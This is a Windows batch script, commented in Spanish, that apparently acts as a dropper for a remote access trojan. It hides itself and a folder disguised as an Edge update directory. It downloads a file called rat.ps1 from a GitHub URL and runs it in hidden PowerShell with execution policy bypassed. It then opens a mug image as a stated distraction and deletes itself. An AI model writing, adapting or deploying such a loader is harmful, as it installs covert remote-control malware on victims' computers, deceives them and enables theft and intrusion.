@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

REM Crear carpeta oculta
if not exist "%APPDATA%\Microsoft\EdgeUpdate" mkdir "%APPDATA%\Microsoft\EdgeUpdate"
attrib +h "%APPDATA%\Microsoft\EdgeUpdate"

REM Descargar rat.ps1 si no existe
if not exist "%APPDATA%\Microsoft\EdgeUpdate\updater.ps1" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1' -OutFile '%APPDATA%\Microsoft\EdgeUpdate\updater.ps1' -UseBasicParsing -ErrorAction Stop } catch {}" >nul 2>&1
)

REM Ejecutar PowerShell en proceso independiente (sin VBS)
start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \"%APPDATA%\Microsoft\EdgeUpdate\updater.ps1\"' -WindowStyle Hidden"

REM Esperar 2 segundos
timeout /t 2 /nobreak >nul

REM Distracción
start https://ih1.redbubble.net/image.2807335966.3394/mug,standard,x334,right-pad,600x600,f8f8f8.jpg

REM Auto-eliminar
(goto) 2>nul & del "%~f0"
